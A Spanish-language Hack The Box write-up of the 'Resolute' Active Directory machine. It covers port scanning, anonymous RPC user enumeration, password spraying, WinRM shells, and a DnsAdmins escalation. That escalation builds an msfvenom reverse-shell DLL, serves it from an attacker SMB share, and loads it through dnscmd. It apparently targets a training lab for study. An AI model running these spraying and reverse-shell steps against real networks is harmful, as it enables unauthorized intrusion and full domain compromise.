---
title: "HTB: Resolución de Resolute"
date: 2023-07-27 12:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [password spraying, rpc, guest session, evil-winrm, dnsadmins, ntds, msfvenom, dnscmd, smbserver, crackmapexec, smbclient, smbmap, rpcclient, nmap, kerbrute]     # TAG names should always be lowercase
image: resolute.png
img_path: /photos/2023-07-27-Resolute-WriteUp/
---

**Resolute** es una máquina **Windows** de **dificultad media** centrada en la explotación de Active Directory. Mediante la enumeración de usuarios y la técnica de **password spraying**, se obtiene acceso al sistema como el usuario `melanie`. A través de un proceso de **reconocimiento interno**, se descubren las credenciales de `ryan`, un usuario del grupo `DnsAdmins`, vulnerable a la escalada de privilegios. Con los privilegios elevados adquiridos, la máquina es resuelta. 

El **[Anexo I](#anexo-i-volcado-del-ntds-para-persistencia-en-el-dominio)** profundiza en cómo volcar el NTDS para obtener **persistencia en el dominio** y control sobre las cuentas de usuario.

## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.


```bash
r1pfr4n@parrot> ping -c 1 10.10.10.169

PING 10.10.10.169 (10.10.10.169) 56(84) bytes of data.
64 bytes from 10.10.10.169: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.10.169 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.199/113.199/113.199/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.169 -oG allPorts

...[snip]...
Nmap scan report for 10.10.10.169
Host is up, received user-set (0.12s latency).
Scanned at 2023-07-26 16:50:16 CEST for 15s
Not shown: 65494 closed tcp ports (reset), 17 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49713/tcp open  unknown          syn-ack ttl 127
49743/tcp open  unknown          syn-ack ttl 127
...[snip]...
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49684,49713,49743 10.10.10.169 -oN targeted

...[snip]...
Nmap scan report for 10.10.10.169
Host is up (0.11s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-26 14:58:10Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49678/tcp open   msrpc        Microsoft Windows RPC
49679/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open   msrpc        Microsoft Windows RPC
49713/tcp open   msrpc        Microsoft Windows RPC
49743/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-07-26T07:59:00-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m56s, deviation: 4h02m29s, median: 6m55s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-26T14:59:03
|_  start_date: 2023-07-26T14:55:38

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.23 seconds
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta scripts por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los **servicios en ejecución**, como **versiones** y **detalles de la configuración**. A continuación, se proporciona un **desglose detallado** de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.

| Puerto(s) | Servicio | Descripción | Relevancia |
|--------|----------|-------------|------------|
| 53 | Domain (DNS) | El servicio DNS se utiliza para resolver nombres de dominio en direcciones IP y viceversa. | Las configuraciones incorrectas o las entradas DNS malintencionadas pueden ser explotadas. |
| 88 | Kerberos | Kerberos es un protocolo de autenticación de red. | Las vulnerabilidades o debilidades en Kerberos pueden permitir la escalada de privilegios o la falsificación de identidad. |
| 135, 49664-49667, 49671, 49678, 49684, 49713 | MSRPC | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red. | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código. |
| 139/445 | NetBIOS-ssn/Microsoft-ds | NetBIOS y SMB son protocolos de compartición de archivos y servicios. | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 389/636, 3268/3269 | LDAP/LDAP SSL/Global Catalog LDAP | El Protocolo Ligero de Acceso a Directorios (LDAP) se utiliza para acceder y gestionar directorios distribuidos sobre redes IP. | Las configuraciones incorrectas o las vulnerabilidades en LDAP pueden permitir la enumeración de usuarios o la escalada de privilegios. |
| 464 | kpasswd5 | Este puerto está asociado con el servicio de cambio de contraseña de Kerberos. | Las vulnerabilidades asociadas pueden permitir la modificación de contraseñas de usuario. |
| 593, 49679 | HTTP-RPC-epmap/ncacn_http | Puntos de extremo de mapeo para RPC sobre HTTP. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código. |
| 5985, 47001 | WS-Management/WinRM | Estos servicios permiten el acceso remoto a los sistemas de administración. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código o la escalada de privilegios. |
| 9389 | .NET Message Framing | Este puerto se utiliza para la comunicación en el marco de mensajes .NET. | Las vulnerabilidades pueden permitir ataques de inyección de código o la ejecución remota de código. |

### Puertos 139/445 abiertos (SMB)

**El protocolo SMB (Server Message Block)**, que opera a través de los puertos 139 y 445, se selecciona para un reconocimiento inicial por su relevancia en la configuración de redes Windows y su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que proporciona **servicios compartidos** de archivos e impresoras. Aunque es un componente esencial en los sistemas operativos Windows, también puede encontrarse en otras plataformas.

Para empezar, se utiliza la herramienta `crackmapexec` para recopilar más información sobre el servicio SMB que se ejecuta en la máquina objetivo. El comando utilizado es el siguiente:


```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.169
```

La ejecución de este comando arroja el siguiente resultado:

![imagen 2](Pasted image 20230726165230.png)

Aquí, vemos que el nombre de la máquina es **"RESOLUTE"**, está utilizando el dominio **"megabank.local"**, y tiene habilitada la opción de firmado SMB (**signing: True**). El firmado SMB es una configuración de seguridad que previene ataques man-in-the-middle al requerir que los paquetes SMB estén firmados digitalmente. También podemos observar que la versión de Windows corresponde a **Windows Server 2016**. Además, se descubre que el **protocolo SMBv1** está habilitado en la máquina. 

Para facilitar trabajos futuros, se añade el dominio "megabank.local" al archivo `/etc/hosts` para permitir que se resuelva localmente:

![imagen 3](Pasted image 20230726165308.png)

A continuación, se intenta enumerar los **recursos compartidos disponibles** en la máquina objetivo. Sin embargo, a pesar de probar con diferentes herramientas, no se encuentran recursos compartidos accesibles.

Las **herramientas** y comandos utilizados para intentar enumerar los recursos compartidos son los siguientes:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.169 -u '' -p '' --shares
r1pfr4n@parrot> smbclient -L 10.10.10.169 -N
r1pfr4n@parrot> smbmap -H 10.10.10.169 -u 'test'
```

El comando `smbclient` proporciona la siguiente salida:

```bash
r1pfr4n@parrot> smbclient -L 10.10.10.169 -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Esto sugiere que el acceso anónimo es factible, pero **no se logra visualizar ningún recurso compartido disponible**. Esto puede indicar que los recursos compartidos están restringidos a determinados usuarios, o simplemente que no existen en la máquina objetivo.


### Puerto 135 abierto (RPC)

El **RPC (Remote Procedure Call)** es una tecnología que se emplea en los sistemas operativos Windows para permitir que un programa ejecute código de manera remota. En este contexto, se explora el puerto 135 debido a las múltiples oportunidades que ofrece para la **enumeración de recursos del dominio**, incluyendo **usuarios, grupos, políticas** y más.

Aunque se podría esperar que la enumeración de recursos requiriera credenciales válidas, en ciertas configuraciones de Active Directory, la **enumeración de recursos** puede ser posible incluso para un **usuario invitado**. Esto se debe a que en ocasiones, la política de seguridad se configura de tal manera que la enumeración de los recursos de un dominio está permitida para todos los usuarios, incluso los no autenticados.

Para conectarse con el servicio RPC, se utiliza el siguiente comando:

```bash
r1pfr4n@parrot> rpcclient -U "" -N 10.10.10.169
```

Una vez en la interfaz de `rpcclient`, se usa `enumdomusers` para enumerar los usuarios del dominio, obteniendo una lista de usuarios.

![imagen 2](Pasted image 20230726165755.png)

Para obtener una lista limpia de nombres de usuario, se guarda toda esta información en un documento `users.txt` y se procesa de la siguiente manera:

```bash
r1pfr4n@parrot> cat users.txt | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | sort -u | sponge users.txt
```

El resultado es el siguiente:

```bash
abigail
Administrator
angela
annette
annika
claire
claude
DefaultAccount
felicia
fred
Guest
gustavo
krbtgt
marcus
marko
melanie
naoki
paulo
per
ryan
sally
simon
steve
stevie
sunita
ulf
zach
```

La disponibilidad de esta lista de usuarios abre la puerta a la posibilidad de explotar el **ataque ASREPRoast**. ASREPRoast se aprovecha de las cuentas de usuario que tienen **desactivada** la **preautenticación Kerberos**, permitiendo solicitar hashes de contraseñas para dichas cuentas y, a partir de ahí, intentar romper estas contraseñas offline. Sin embargo, para la resolución de esta máquina, **no se seguirá esta línea de ataque**, por lo que la ejecución del ASREPRoast no se abordará en detalle.

Además de `enumdomusers`, `rpcclient` ofrece otros comandos para enumerar recursos como los siguientes:

-   `enumdomgroups`: enumera todos los grupos de dominio.
-   `querydispinfo`: muestra información de visualización para todos los usuarios.
-   `querygroupmem [group RID]`: muestra los miembros del grupo especificado.
-   `queryuser [user RID]`: muestra información sobre el usuario específico.

Por ejemplo, para conocer los usuarios que conforman el grupo **Domain Admins**, se pueden ejecutar los siguientes comandos:

![imagen 2](Pasted image 20230726170214.png)

El grupo **Domain Admins** está conformado por un único usuario: **Administrator**.

Al ejecutar `querydispinfo`, se descubre en la descripción de un usuario llamado *Marko Novak* (con nombre de dominio marko) la siguiente frase: "*Account created. Password set to Welcome123!*". Si efectivamente se ha utilizado esta contraseña para la configuración de la cuenta de marko, se estaría en posesión de unas **credenciales válidas** para el dominio.

Para comprobar si las credenciales son válidas, se puede utilizar el siguiente comando de `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.169 -u 'marko' -p 'Welcome123!'
```

Este comando confirma si las credenciales son válidas o no. Lamentablemente, no lo son:

![imagen 2](Pasted image 20230726170521.png)

No obstante, teniendo una contraseña potencial, es posible intentar un **password spraying** con esta **contraseña** y con la **lista de usuarios** extraída previamente, para identificar si, por casualidad, la contraseña es la misma para cualquier otro usuario del dominio.

## Consiguiendo Shell Como Melanie

A través de la técnica de **password spraying**, aplicada sobre la contraseña encontrada anteriormente y la lista de usuarios enumerados, se logra encontrar las **credenciales** válidas para el usuario de dominio '**melanie**'.

### Password Spraying en Detalle

El **password spraying** es una técnica de prueba de contraseñas que, en lugar de intentar muchas contraseñas en una sola cuenta (un ataque de fuerza bruta), **prueba una sola contraseña** comúnmente utilizada **en muchas cuentas** antes de pasar a probar una siguiente contraseña. La estrategia se basa en la posibilidad de que entre un número suficientemente grande de usuarios, algunos de ellos usarán contraseñas comunes o débiles.

En este contexto específico, la técnica se aplicará a los usuarios del dominio que se han enumerado anteriormente, utilizando la contraseña '**Welcome123!**' que se descubrió en la descripción del usuario *Marko Novak*.

Para realizar la prueba de password spraying, se proponen dos herramientas: `CrackMapExec` y `Kerbrute`. Ambas cumplen el mismo propósito, pero proporcionan diferentes funcionalidades y pueden ser útiles en diferentes contextos.

#### CrackMapExec

La primera herramienta que se propone para este fin es `CrackMapExec`. El comando para realizar el password spraying con CrackMapExec es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
```

- `smb`: Es el protocolo que se va a utilizar.
- `10.10.10.169`: Es la dirección IP de la máquina objetivo.
- `-u users.txt`: Indica el archivo que contiene la lista de nombres de usuario que se van a probar.
- `-p 'Welcome123!'`: Es la contraseña que se va a probar para cada usuario en la lista.

El resultado de este comando indica que la contraseña '**Welcome123!**' es **válida** para el **usuario** del dominio '**melanie**'.

![imagen 2](Pasted image 20230726170601.png)

#### Kerbrute

La segunda herramienta que se propone es `Kerbrute`, una utilidad diseñada para realizar ataques de fuerza bruta y password spraying a cuentas de usuario de Active Directory utilizando el protocolo Kerberos. Kerbrute es una [herramienta de ropnop](https://github.com/ropnop/kerbrute). El comando para realizar el password spraying con Kerbrute es el siguiente:

```bash
r1pfr4n@parrot> kerbrute passwordspray --dc 10.10.10.169 -d megabank.local users.txt 'Welcome123!'
```

- `passwordspray`: Indica que se va a utilizar la modalidad de password spraying.
- `--dc 10.10.10.169`: Especifica la dirección IP del controlador de dominio.
- `-d megabank.local`: Especifica el nombre del dominio.
- `users.txt`: Es el archivo que contiene la lista de nombres de usuario que se van a probar.
- `'Welcome123!'`: Es la contraseña que se va a probar para cada usuario en la lista.

Al igual que con CrackMapExec, el resultado de este comando también muestra que la contraseña '**Welcome123!**' es **válida** para el **usuario** del dominio '**melanie**'.

![imagen 2](Pasted image 20230727113205.png)

### Obtención de Shell a Través de WinRM como Melanie

Ahora que se ha obtenido las credenciales de `melanie`, es posible avanzar y explorar nuevas formas de explotación. En concreto, se buscará acceder a la máquina objetivo utilizando el servicio **Windows Remote Management (WinRM)**.

**WinRM** es un servicio de administración remota basado en estándares que se incluye con Windows Server. Permite a los administradores de sistemas **ejecutar comandos de administración** y scripts **en sistemas remotos a través de la red**. Recordemos que, durante la fase de escaneo inicial, se identificó que el puerto **5985**, el puerto predeterminado para WinRM, estaba abierto.

Antes de intentar la conexión, es importante verificar que el usuario `melanie` tiene permisos para acceder al servicio WinRM. Para ello, se utiliza la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```

Este comando verifica si las credenciales proporcionadas permiten el acceso al servicio WinRM en el host objetivo. Si el resultado muestra `Pwned!`, eso indica que el usuario `melanie` tiene los permisos necesarios para acceder a WinRM, probablemente debido a que pertenece al grupo `Remote Management Users`.

![imagen 2](Pasted image 20230726170754.png)

Una vez confirmado el acceso, se puede conectar a WinRM utilizando la herramienta `evil-winrm`:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```

`Evil-winrm` es una herramienta de shell interactiva que permite la administración remota de la máquina objetivo. Al ejecutar el comando anterior, se inicia una conexión con la máquina objetivo a través del servicio WinRM utilizando las credenciales de `melanie`. Si todo sale según lo previsto, se obtendrá una shell que permitirá una exploración más profunda del sistema:

![imagen 2](Pasted image 20230726170853.png)

### user.txt

Encontraremos la **primera flag** en el directorio **Desktop** del usuario **melanie**:

```powershell
PS C:\Users\melanie\Desktop> type user.txt
46e5cc4399cb8***203bf21ff77cf8e1
```

## Consiguiendo Shell como System

Después de obtener acceso con las credenciales de **Melanie**, el siguiente paso en este escenario es **escalar privilegios** dentro del dominio. Para esto, se debe realizar una serie de tareas de **enumeración** y explotación adicionales.

### Enumeración del dominio con ldapdomaindump

Antes de recurrir a la enumeración automatizada con herramientas más avanzadas como **BloodHound**, es beneficioso utilizar otras herramientas menos complejas que puedan proporcionar información útil, como **ldapdomaindump**. Esta herramienta se utiliza para **extraer** diversos **datos del dominio** desde el Controlador de Dominio a través del protocolo **LDAP**. Su objetivo principal es crear una vista legible y accesible de la estructura del dominio, incluyendo **usuarios**, **grupos, controladores de dominio, política de contraseñas**, entre otros.

La herramienta se puede ejecutar con el siguiente comando:

```bash
r1pfr4n@parrot> ldapdomaindump -u megabank.local\\melanie -p 'Welcome123!' 10.10.10.169
```

- `-u` y `-p` son las credenciales de usuario y contraseña que se usarán para autenticarse en el Controlador de Dominio.
- `10.10.10.169` es la dirección IP del Controlador de Dominio.

La ejecución de este comando generará **varios archivos** que contienen información detallada sobre el dominio. La información se presenta en diferentes formatos para facilitar su interpretación y análisis.

Para visualizar los archivos HTML generados, se puede desplegar un servidor web utilizando Python. Se puede lograr esto con el comando `sudo python3 -m http.server 80`.

Entre los archivos generados, uno de particular interés es el archivo [domain_users_by_group.html](http://localhost/domain_users_by_group.html). Este archivo presenta una descripción detallada de los grupos dentro del dominio y los usuarios que forman parte de cada grupo. En este caso, se destaca el grupo **Contractors**, formado por el usuario **Ryan Bertrand** (nombre en el dominio: ryan):

![imagen 2](Pasted image 20230726171908.png)

El grupo **Contractors** es miembro del grupo **DnsAdmins**, conocido por ser **vulnerable a escalada de privilegios**:

![imagen 2](Pasted image 20230726171840.png)

La naturaleza transitiva de los grupos en Windows significa que los grupos pueden ser miembros de otros grupos y que los usuarios heredan los derechos y permisos de todos los grupos a los que pertenecen, directa o indirectamente. Por lo tanto, como Ryan es miembro de Contractors y Contractors es miembro de DnsAdmins, **Ryan es efectivamente miembro de DnsAdmins**. 

Además, Contractors también es miembro del grupo **Remote Management Users**, por lo que **Ryan tiene la capacidad de conectarse a través de WinRM**:

![imagen 2](Pasted image 20230727121253.png)

Con esta información en mente, la **estrategia** es clara. El objetivo es **pivotar desde Melanie a Ryan**, **explotar** su pertenencia al grupo **DnsAdmins** para **escalar a Administrator**, y así obtener acceso completo al dominio. Por tanto, el siguiente paso crucial en la implementación de esta estrategia es **identificar un método efectivo para obtener las credenciales del usuario Ryan**. Con estas credenciales en mano, se abrirán nuevas posibilidades para avanzar hacia el control total del dominio.

### Descubrimiento y validación de las credenciales de Ryan

En una exploración más profunda del sistema, se encuentra una carpeta oculta en la raíz llamada `PSTranscripts`, descubierta utilizando el comando `dir -Force C:\` en PowerShell. Este comando lista el contenido de un directorio, en este caso, la raíz (C:\). El parámetro `-Force` muestra archivos y carpetas ocultas que normalmente no serían visibles.

El análisis se profundiza al explorar la carpeta `PSTranscripts`, donde se localiza otra carpeta oculta, `20191203`, mediante el comando `dir -Force C:\PSTranscripts`. Dentro de esta carpeta, se descubre un archivo con nombre `PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`, logrado con la aplicación del comando `dir -Force C:\PSTranscripts\20191203`.

El archivo descubierto es un **registro de transcripción de PowerShell**. Las transcripciones de PowerShell, archivos de texto con un registro detallado de una sesión de PowerShell, son instrumentos valiosos para auditores de sistemas y programadores.

Uno de los **comandos** dentro de esta transcripción resalta por su relevancia:

![imagen 2](Pasted image 20230726175036.png)

Esta línea muestra la ejecución de un comando `net use`, que en Windows sirve para conectar o desconectar una unidad de red. Aquí parece que el usuario `ryan` intenta conectar a la carpeta compartida `\\fs01\backups` utilizando la contraseña `Serv3r4Admin4cc123!`.

Para comprobar la validez de estas credenciales, se utiliza la herramienta `crackmapexec` con el siguiente comando:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```

Una confirmación de la validez de las credenciales se produce si el resultado arroja un signo más (**+**):

![imagen 2](Pasted image 20230726175105.png)

En una nota interesante, el resultado también muestra un mensaje "**Pwned!**", que normalmente indicaría que el usuario podría establecer una conexión con la máquina y ejecutar comandos de forma remota mediante herramientas como psexec.py. No obstante, este comportamiento no se cumple en este caso. Una exploración más a fondo de este fenómeno se puede encontrar en el blog de **0xdf**, [Resolute: More Beyond Root](https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html).

Dada la pertenencia de Ryan al grupo `Remote Management Users`, se plantea la posibilidad de utilizar las credenciales validadas para establecer una conexión con `winrm` y ejecutar comandos como el usuario Ryan. Esta conexión se materializa con la ayuda de la herramienta `evil-winrm`:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```

El resultado de esta operación es el siguiente:

![imagen 2](Pasted image 20230726175248.png)


### Posible Explotación del Grupo DnsAdmins

En el transcurso de la enumeración del sistema con `ldapdomaindump`, se reveló un dato clave: el usuario `ryan` es miembro del grupo `Contractors`, que a su vez es miembro del grupo `DnsAdmins`. Esta pertenencia se puede confirmar con el comando `whoami /groups`, que proporciona un desglose detallado de los grupos a los que el usuario actual pertenece.

![imagen 2](Pasted image 20230726175337.png)

Entonces, ¿qué significa ser miembro del grupo `DnsAdmins`? ¿Por qué esto podría representar una oportunidad para una escalada de privilegios?

Según la [documentación oficial de Microsoft](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins), el grupo `DnsAdmins` es un grupo de seguridad en Windows que permite a sus miembros realizar tareas administrativas en servidores DNS. 

![imagen 2](Pasted image 20230726175448.png)

Esto incluye la capacidad de ver y cambiar los registros DNS, además de configurar las propiedades del servidor DNS. Aunque el grupo `DnsAdmins` no tiene privilegios administrativos a nivel de dominio por defecto, su capacidad para alterar la configuración del servidor DNS puede ser explotada para una escalada de privilegios.

Aquí radica la clave de esta vulnerabilidad: los miembros del grupo `DnsAdmins` pueden cambiar la configuración de los servidores DNS para **que carguen una DLL personalizada cada vez que se inicia el servicio DNS**. Esta **DLL** personalizada **puede contener cualquier código**, incluso aquel que otorga privilegios de administrador de dominio al atacante.

Es crucial entender que esta característica no es un error del sistema, sino una funcionalidad de diseño. Sin embargo, en un entorno de red mal configurado o mal administrado, puede convertirse en un vector de ataque potencial.

Para obtener más información sobre el grupo `DnsAdmins`, se puede consultar el enlace a la documentación oficial de Microsoft: [Understand Security Groups](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins).

### Explotación del Grupo DnsAdmins para Escalada de Privilegios

Para explotar la vulnerabilidad asociada con el grupo `DnsAdmins`, se sigue un procedimiento que consta de varios pasos y culmina en la **adquisición de una shell remota con privilegios elevados**. Toda esta información ha sido extraída del artículo [Windows Privilege Escalation : DnsAdmins to DomainAdmin](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/). La secuencia de pasos es la siguiente:

1. **Creación de la DLL maliciosa**: La herramienta `msfvenom` de Metasploit se emplea para generar payloads de código malicioso. El comando es el siguiente:

```bash
r1pfr4n@parrot> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll > reverse_shell.dll
```

   En este comando, `-p` especifica el payload que se va a utilizar (`windows/x64/shell_reverse_tcp`, una shell reversa para sistemas Windows de 64 bits). Los parámetros `LHOST` y `LPORT` representan la dirección IP y el puerto del sistema atacante, respectivamente, mientras que `-f dll` indica que el output debe ser en formato DLL. Este comando se ejecuta en la máquina atacante.

2. **Despliegue del servicio SMB en la máquina atacante**: Esto se realiza para compartir la DLL maliciosa sin necesidad de subirla directamente a la máquina víctima. Para esto, se emplea el comando `smbserver.py` de la siguiente manera:

```bash
r1pfr4n@parrot> sudo smbserver.py shares $(pwd) -smb2support
```

   Aquí, `shares` es el nombre del recurso compartido que se creará, `$(pwd)` se usa para compartir el directorio actual, y `-smb2support` permite la compatibilidad con SMBv2.

3. **Configuración del listener**: Antes de activar el payload, es necesario configurar un listener para recibir la shell reversa. Esto se realiza con `netcat` en el puerto especificado en el payload (`443` en este caso):

```bash
r1pfr4n@parrot> sudo rlwrap nc -nlvp 443
```

   `rlwrap` se utiliza para mejorar la interacción con la shell remota que se reciba, ofreciendo funciones como la navegación mediante las teclas de flechas o el almacenamiento de historial de comandos. `nc` es netcat, `-n` evita las búsquedas DNS, `-l` coloca a netcat en modo de escucha, `-v` activa el modo verbose para obtener más detalles sobre la conexión, y `-p` especifica el puerto.

4. **Uso de `dnscmd.exe` para cargar la DLL maliciosa en el servidor DNS**: `dnscmd.exe` es una herramienta de línea de comandos para administrar el servidor DNS de Windows. En este caso, se usa para cambiar la configuración del servidor DNS y hacer que cargue la DLL maliciosa cada vez que se inicie el servicio DNS. Este comando se ejecuta en la máquina víctima:

```powershell
PS C:\> dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\shares\reverse_shell.dll
```

   Aquí, `/config` se usa para cambiar la configuración del servidor, y `/serverlevelplugindll` se usa para especificar la ruta de la DLL que se cargará al iniciar el servidor.

5. **Reinicio del servicio DNS**: Finalmente, se utiliza `sc.exe` para reiniciar el servicio DNS, activando así el payload de la DLL maliciosa. Este comando también se ejecuta en la máquina víctima:

```powershell
PS C:\> sc.exe stop dns
PS C:\> sc.exe start dns
```

   `sc.exe` es una herramienta de línea de comandos para comunicarse con el Controlador de servicios de Windows. Aquí, se usa para detener (`stop`) e iniciar (`start`) el servicio DNS.

La secuencia de estos pasos (a partir del paso número dos) se muestra a continuación en una imagen:

![imagen 2](Pasted image 20230726183654.png)

Siguiendo correctamente estos pasos, se debería recibir una shell inversa en el listener configurado, brindando un control remoto del sistema con privilegios elevados. Si no se recibe la shell inversa inmediatamente, se recomienda reejecutar los comandos `sc.exe stop dns` y `sc.exe start dns` hasta establecer la conexión.

Con la recepción de la shell reversa como `SYSTEM`, se obtiene el nivel más alto de privilegios en el sistema. Esto permite navegar hasta el Escritorio del usuario `Administrator`, donde se puede localizar y visualizar la **segunda flag**. Con esto, se concluye la explotación exitosa de la máquina y la obtención de acceso total al sistema.

Es importante recordar que esta escalada de privilegios se logra gracias a la pertenencia del usuario `ryan` al grupo `DnsAdmins`, que le proporciona los permisos necesarios para modificar la configuración del servidor DNS y así ejecutar código con privilegios elevados.

